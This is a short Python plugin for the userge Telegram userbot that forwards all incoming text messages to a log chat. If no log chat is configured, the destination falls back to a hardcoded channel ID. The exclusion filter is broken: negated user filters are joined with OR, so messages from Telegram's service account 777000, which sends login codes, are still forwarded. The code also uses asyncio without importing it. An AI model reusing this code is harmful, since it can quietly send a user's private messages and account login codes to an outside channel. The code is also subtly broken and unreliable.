import os
from userge import userge, Message
from pyrogram import filters
from pyrogram.errors import FloodWait

PM_LOG = int(os.environ.get("PM_LOG", "-1001457141157"))

DISALOW = [int(i) for i in os.environ.get("DISALOW", "777000").split(" ")]  

DISALOW2 = [int(i) for i in os.environ.get("DISALOW2", "340489014").split(" ")]

@userge.on_message(filters.text & filters.incoming & (~filters.bot | filters.group | ~filters.user(DISALOW) | ~filters.user(DISALOW2)))
async def hlo(b, m):
    try: 
        await m.forward(
            chat_id=PM_LOG,
            disable_notification=True)
    except FloodWait as e:
        await asyncio.sleep(e.x)
    except Exception as e:
        print(e)
        pass
